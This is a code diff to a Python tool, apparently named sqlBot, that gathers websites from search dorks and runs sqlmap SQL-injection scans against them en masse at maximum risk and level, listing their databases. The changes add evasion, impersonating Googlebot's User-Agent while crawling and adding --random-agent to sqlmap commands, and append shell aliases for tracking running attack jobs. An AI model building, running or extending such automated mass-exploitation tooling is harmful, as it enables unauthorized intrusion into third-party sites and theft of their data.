@@ -147,7 +147,7 @@ def getRecursiveUrls(link,recuriveSearch):
 	text=""
 	headers = {
    'Referer': 'http://www.google.com/bot.html',
-   'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36'
+   'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
 }
 	#response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
 	try:
@@ -261,7 +261,7 @@ def testSite(site):
 
 	headers = {
    'Referer': 'http://www.google.com/bot.html',
-   'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36'
+   'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
 }
 	#response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
 	try:
@@ -462,7 +462,7 @@ def filter():
 					with open("dbs/"+file, "w+") as result:
 						result.write(site+"\n")
 						for db in dbList:
-							result.write("python "+sqlMapPath+"/sqlmap/sqlmap.py -u %s --risk 3 --level 5 --batch -D "%(site,)+db+"\n")
+							result.write("python "+sqlMapPath+"/sqlmap/sqlmap.py -u %s --risk 3 --level 5 --batch --random-agent -D "%(site,)+db+"\n")
 						result.close()
 					os.remove("finished/"+file)
 				else:
@@ -587,7 +587,7 @@ def exploit(maxthreads):
 			randomInt1=randint(0, 9)
 			randomInt2=randint(0, 9)
 			print(greenFont+"executing exploit for "+siteFile+"\n"+endFont)
-			command=' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,siteFile,str(randomInt1)+str(randomInt2),sqlMapPath+"/sqlmap/",site,siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2))
+			command=' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,siteFile,str(randomInt1)+str(randomInt2),sqlMapPath+"/sqlmap/",site,siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2))
 			os.system(command)
 			while(priorityFileNumber==0 and errorFileNumber == 0):
 				print(greenFont+"Waiting for sites to come\n"+endFont)
@@ -656,7 +656,18 @@ def setup():
 	os.system("apt install python3-pip")
 	os.system("pip3 install selenium")
 	os.system("apt install python")
-	os.system("export PATH=$PATH:"+firefoxDriver)
+	
+	os.system("echo \"alias clean='python3 clean.py'\" >> ~/.bashrc ")
+	os.system("echo \"alias egrep='egrep --color=auto'\" >> ~/.bashrc ")
+	os.system("echo \"alias fgrep='fgrep --color=auto'\" >> ~/.bashrc ")
+	os.system("echo \"alias filter='zeb ; python3 extractSites.py filter'\" >> ~/.bashrc ")
+	os.system("echo \"alias lss='ls -lia'\" >> ~/.bashrc ")
+	os.system("echo \"alias revnc='vncserver -kill :1 ; vncserver'\" >> ~/.bashrc ")
+	os.system("echo \"alias sites='ps aux | grep sqlmap | sed -E '\''/sh -c/d'\'' | sed -E '\''/grep/d'\'' '\" >> ~/.bashrc ")
+	os.system("echo \"alias webvnc='websockify -D --web=/usr/share/novnc/ --cert=/etc/ssl/novnc.pem 6080 localhost:5901'\" >> ~/.bashrc ")
+	os.system("echo \"alias zeb='cd /root/Desktop/sqlBot'\" >> ~/.bashrc ")
+	os.system("echo \"export PATH=$PATH:\"%s >> ~/.bashrc "%(firefoxDriver,))
+
 	os.system("touch "+priorityFile+" "+errorFile+" "+sitesFile+" "+dorkListFile+ " "+bannedKeywordsFile+" "+recursiveSitesFile+" "+banningFile)
 	#os.system("echo \"google.\" > "+bannedKeywordsFile)
 
